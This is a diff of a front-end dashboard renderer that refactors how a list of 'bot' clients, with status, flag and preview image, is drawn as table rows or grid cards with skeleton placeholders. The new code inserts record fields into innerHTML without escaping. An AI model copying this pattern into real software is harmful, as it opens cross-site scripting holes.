@@ -1,5 +1,5 @@
-/* frontend/dashboard/js/modules/ui/renderer.js */
-
+// frontend/dashboard/js/modules/ui/renderer.js
+// Отрисовка данных в табличном или плиточном виде с поддержкой скелетной загрузки
 const getFlag = l => (!l || l.length !== 2) ? '🏳️' : l.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));
 const $ = id => document.getElementById(id);
 
@@ -12,7 +12,7 @@ export const Renderer = {
     toggleView() {
         isGridView = !isGridView;
         const btn = $('toggleView');
-        if (btn) btn.innerHTML = isGridView ? '<i class="fas fa-list"></i> Table' : '<i class="fas fa-th"></i> Grid';
+        btn && (btn.innerHTML = isGridView ? '<i class="fas fa-list"></i> Table' : '<i class="fas fa-th"></i> Grid');
         return isGridView;
     },
 
@@ -55,23 +55,17 @@ export const Renderer = {
         const tbody = $('clients-list');
         if (!tbody) return;
 
-        const rows = list.map(bot => {
-            const tr = document.createElement('tr');
-            tr.className = `client-row ${bot.status}`;
-            tr.dataset.clientId = bot.id;
-            tr.innerHTML = this._getRowTemplate(bot);
-            return tr;
-        });
+        tbody.innerHTML = list.map(bot => `
+            <tr class="client-row ${bot.status}" data-client-id="${bot.id}">
+                ${this._getRowTemplate(bot)}
+            </tr>`).join('');
 
-        tbody.innerHTML = '';
-        rows.forEach(r => tbody.appendChild(r));
-
-        const skeletonsNeeded = Math.max(0, MIN_SKELETONS - list.length);
-        tbody.insertAdjacentHTML('beforeend', this._getSkeletonRow().repeat(skeletonsNeeded));
+        const skels = Math.max(0, MIN_SKELETONS - list.length);
+        tbody.insertAdjacentHTML('beforeend', this._getSkeletonRow().repeat(skels));
     },
 
     drawGrid(list, cont) {
-        const realCards = list.map(c => `
+        const cards = list.map(c => `
             <div class="client-card ${c.status}" data-client-id="${c.id}">
                 <div class="bot-preview">
                     <img src="${c.lastPreview || '../images/test2.jpg'}" id="prev-${c.id}">
@@ -88,7 +82,7 @@ export const Renderer = {
                 </div>
             </div>`).join('');
 
-        const skeletonsNeeded = Math.max(0, MIN_SKELETONS - list.length);
-        cont.innerHTML = realCards + this._getSkeletonCard().repeat(skeletonsNeeded);
+        const skels = Math.max(0, MIN_SKELETONS - list.length);
+        cont.innerHTML = cards + this._getSkeletonCard().repeat(skels);
     }
 };
